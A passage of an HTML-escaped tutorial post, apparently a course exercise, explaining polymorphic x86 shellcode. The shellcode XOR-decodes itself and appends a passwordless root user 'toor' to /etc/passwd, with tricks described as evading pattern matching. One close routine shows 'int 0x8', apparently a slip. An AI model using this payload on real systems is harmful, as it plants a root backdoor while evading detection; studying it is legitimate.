    &lt;span class=&quot;nl&quot;&gt;EncodedStringBytes:&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;db&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x5e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x06&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x5e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x13&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x02&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x06&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x02&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x07&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x75&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x05&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x07&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x4b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x59&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x53&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x4f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x41&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x59&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x45&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x41&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x59&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x5a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x03&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x01&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x4b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x4c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x01&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x4c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x01&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x02&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x69&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x75&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;The size of the resulting shellcode is &lt;code&gt;123 bytes&lt;/code&gt;, which means &lt;code&gt;115%&lt;/code&gt; compared to the original shellcode. Since the majority of the bytes are completely different (e.g. the strings &lt;code&gt;/etc/passwd&lt;/code&gt; and the new line added to the former), I think this is a good compromise.&lt;/p&gt;
&lt;h3 id=&quot;analysis-1&quot;&gt;Analysis&lt;/h3&gt;
&lt;p&gt;Let's analyse the first two routines of the polymorphic shellcode:&lt;/p&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nl&quot;&gt;_start:&lt;/span&gt;

    &lt;span class=&quot;nf&quot;&gt;jmp&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;short&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;CallRunShellcode&lt;/span&gt;

&lt;span class=&quot;nl&quot;&gt;RunShellcode:&lt;/span&gt;

    &lt;span class=&quot;nf&quot;&gt;pop&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;edi&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;esi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;edi&lt;/span&gt;

    &lt;span class=&quot;nf&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ecx&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;mul&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ecx&lt;/span&gt;

    &lt;span class=&quot;nf&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;11&lt;/span&gt;
    
    &lt;span class=&quot;c1&quot;&gt;; ...&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;sub class='aside'&gt;The assembly code in between has been omitted for clarity, in order to show the &lt;code&gt;JMP-CALL-POP&lt;/code&gt; technique
&lt;/sub&gt;&lt;/p&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;c1&quot;&gt;; ...&lt;/span&gt;

&lt;span class=&quot;nl&quot;&gt;CallRunShellcode:&lt;/span&gt;

    &lt;span class=&quot;nf&quot;&gt;call&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;RunShellcode&lt;/span&gt;
    &lt;span class=&quot;nl&quot;&gt;EncodedStringBytes:&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;db&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x5e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x06&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x5e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x13&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x02&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x06&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x02&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x07&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x75&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x05&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x07&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x4b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x59&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x53&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x4f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x41&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x59&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x45&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x41&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x59&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x5a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x03&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x01&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x4b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x4c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x01&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x4c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x01&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x02&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x69&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x75&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Compared to the original shellcode, I'm still using the the &lt;code&gt;JMP-CALL-POP&lt;/code&gt; technique. I decided against pushing all the bytes 4 DWORDS at a time, as that would require way more bytes (considering the XOR operations too).&lt;/p&gt;
&lt;p&gt;I'm saving the pointer to the bytes referenced by &lt;code&gt;EncodedStringBytes&lt;/code&gt; into the register &lt;code&gt;EDI&lt;/code&gt; instead of &lt;code&gt;ESI&lt;/code&gt;, in order to change the resulting bytes.&lt;/p&gt;
&lt;p&gt;However, I had to use the register &lt;code&gt;ESI&lt;/code&gt; too, because I would later use &lt;code&gt;EDX&lt;/code&gt; for decoding the XOR-ed bytes.&lt;/p&gt;
&lt;p&gt;The other instructions (&lt;code&gt;xor&lt;/code&gt;, &lt;code&gt;mul&lt;/code&gt;, and &lt;code&gt;mov&lt;/code&gt;) weren't present in the original shellcode, but I needed them for the decoding stub.&lt;/p&gt;
&lt;p&gt;Follows the next routine:&lt;/p&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nl&quot;&gt;DecodeStringBytes:&lt;/span&gt;
    
    &lt;span class=&quot;c1&quot;&gt;; XOR key: uccq&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;DWORD&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;edi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x75636371&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; now that the 4 bytes are decoded, step to the next 4 bytes&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;edi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x4&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; repeat 11 times, if ECX == 0 don't loop&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;loop&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;DecodeStringBytes&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;The goal of the code above is to decode the encoded bytes, by XOR-ing one DWORD at a time with the key &lt;code&gt;0x75636371&lt;/code&gt;. It doesn't hold any special meaning, it's just 4 random bytes that don't generate any NULL bytes during the XOR operations.&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;loop&lt;/code&gt; instruction, used in conjunction with &lt;code&gt;mov cl, 11&lt;/code&gt; from above, allow the shellcode to repeat the routine &lt;code&gt;DecodeStringBytes&lt;/code&gt; 11 times, in order to decode the &lt;code&gt;44 encoded bytes&lt;/code&gt; referenced by the variable &lt;code&gt;EncodedStringBytes&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Follows the next routine, &lt;code&gt;OpenFile&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nl&quot;&gt;OpenFile:&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; restore EDI to the original value&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;;   (pointing to the start of the decoded bytes)&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;edi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;esi&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; store the pointer to 'toor::0:0:t00r:/root:/bin/bash\0x0a' into ebx&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;edi&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xc&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; save the same pointer into ESI too&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;pop&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;esi&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; store the pointer to '/etc/passwd' into EBX&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;edi&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;pop&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; store 0x5 into EAX (syscall: open())&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x6&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;dec&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; store the WORD 0x1a4 into EDX&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;dl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x69&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;rol&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;edx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; store the WORD 0x442 into ECX&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x443&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;dec&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ecx&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; call syscall 0x5: open()&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;The first instructions are used by the shellcode for retrieving the pointers to the following decoded strings:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;stored into the registers &lt;code&gt;EBX&lt;/code&gt; and &lt;code&gt;EDI&lt;/code&gt;: &lt;code&gt;/etc/passwd&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;stored into the register &lt;code&gt;ESI&lt;/code&gt;: &lt;code&gt;toor::0:0:t00r:/root:/bin/bash&lt;/code&gt; (plus &lt;code&gt;0xa&lt;/code&gt; at the end)&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Compared to the original shellcode, I tried to restrict myself from directly moving bytes into registers, but instead using the &lt;code&gt;PUSH-POP&lt;/code&gt; technique, as it requires the same number of bytes from what I've seen so far.&lt;/p&gt;
&lt;p&gt;Moreover, I didn't want to use hard-coded values (&lt;code&gt;0x1a4&lt;/code&gt; and &lt;code&gt;0x442&lt;/code&gt;), so I simply used &lt;code&gt;DEC&lt;/code&gt; and &lt;code&gt;ROL&lt;/code&gt; to calculate the original values.&lt;/p&gt;
&lt;p&gt;Next, there's the routing &lt;code&gt;AddMaliciousUser&lt;/code&gt;, which appends the string &lt;code&gt;toor::0:0:t00r:/root:/bin/bash&lt;/code&gt; to the previously-opened file, i.e. &lt;code&gt;/etc/passwd&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nl&quot;&gt;AddMaliciousUser:&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; exchange EBX with EAX in order to save the&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;;   file descriptor of the file opened&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;xchg&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; clear EAX for later use&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;pop&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;edx&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; save the DWORD 0x0000001f into EDX&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x20&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;pop&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;edx&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;dec&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;edx&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; save the DWORD 0x00000004 into EAX&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x3&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;pop&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;inc&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; get the pointer to `toor::0:0:t00r:/root:/bin/bash`&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;;   and save it into ECX&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;esi&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;pop&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ecx&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; call syscall write()&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Starting from the top, instead of using &lt;code&gt;mov ebx, eax&lt;/code&gt; I chose to use an instruction I've rarely used up until now: &lt;code&gt;XCHG&lt;/code&gt;, which exchanges the contents of the two registers.&lt;/p&gt;
&lt;p&gt;Next, I've used the instruction &lt;code&gt;XOR&lt;/code&gt;, &lt;code&gt;PUSH&lt;/code&gt;, and &lt;code&gt;POP&lt;/code&gt; in order to clear &lt;code&gt;EDX&lt;/code&gt; and &lt;code&gt;EAX&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Compared to the original shellcode, which simply clears &lt;code&gt;EDX&lt;/code&gt; by means of the instruction &lt;code&gt;xor edx, edx&lt;/code&gt;, mine clears &lt;code&gt;EAX&lt;/code&gt; too, in order to avoid errors caused by the return value of &lt;code&gt;open()&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Moreover, to make the shellcode more polymorphic and evade pattern matching, I used the &lt;code&gt;PUSH-POP&lt;/code&gt; technique to set the desired values into the registers.&lt;/p&gt;
&lt;p&gt;Below is the second-to-last Assembly routine:&lt;/p&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nl&quot;&gt;CloseFileHandle:&lt;/span&gt;

    &lt;span class=&quot;nf&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; call syscall close()&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x6&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x8&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;It closes the file descriptor of the file &lt;code&gt;/etc/passwd&lt;/code&gt;, opened before by means of the syscall &lt;code&gt;open()&lt;/code&gt;. As before, I've explicitly cleared the &lt;code&gt;EAX&lt;/code&gt; register in order to make the shellcode more stable. The rest is the same as the original shellcode.&lt;/p&gt;
&lt;p&gt;Finally, the last routine:&lt;/p&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nl&quot;&gt;Exit:&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; call syscall exit() &lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;inc&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
